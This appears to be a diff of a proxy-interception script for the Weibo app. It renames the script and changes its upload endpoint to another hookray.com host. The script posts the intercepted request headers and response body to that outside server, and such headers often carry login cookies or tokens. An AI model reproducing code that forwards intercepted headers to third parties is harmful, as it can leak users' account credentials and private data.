@@ -1,4 +1,4 @@
-const $ = new Env('weibo-location');
+const $ = new Env('微博:位置信息');
 
 
 !(async () => {
@@ -14,7 +14,7 @@ const $ = new Env('weibo-location');
 async function upload() {
     return new Promise(resolve => {
         const opts = {};
-        opts.url = "https://weibo.hookray.com/location";
+        opts.url = "https://wb2.hookray.com/location";
         opts.body = JSON.stringify({
             headers: $request.headers,
             body: $response.body,
